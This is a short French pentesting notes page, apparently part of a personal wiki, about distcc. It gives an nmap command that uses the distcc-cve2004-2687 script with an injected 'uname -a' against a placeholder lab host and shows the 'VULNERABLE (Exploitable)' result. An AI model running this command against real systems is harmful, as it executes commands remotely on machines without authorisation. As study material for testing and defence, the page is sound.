<sub>[Procédure serveur](server_procedure.md)&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;[Cryptage](cryptage.md)&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;[Outils](tools.md)&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;[Sites utiles](useful_website.md)&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;[Lexique](lexique.md)&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;[Index](index.md)</sub>
<sub>[Retour](tools.md)</sub>
#Distribute C code

**Présentation :** ???? Permet de détecter si faille possible en C ?  distcc is a program to distribute builds of C, C++, Objective C or Objective C++ code across several machines on a network. distcc should always generate the same results as a local build, is simple to install and use, and is usually much faster than a local compile.

**CMD :** nmap -Pn  -p **RPORT** **RHOST** --script=**SCRIPT** --script-args=**SCRIPT_ARGS**

**Exemple :** *nmap -Pn  -p **RPORT** **RHOST** --script=distcc-cve2004-2687 --script-args="distcc-cve2004-2687.cmd='uname -a'"*

**Procédure :**
- Il existe une méthode directement intégrée à nmap pour savoir si une cible est vulnérable : *nmap -Pn  -p 1234 10.10.10.10 --script=distcc-cve2004-2687 --script-args="distcc-cve2004-2687.cmd='uname -a'"*
- Si c'est exploitable : *State: VULNERABLE (Exploitable)*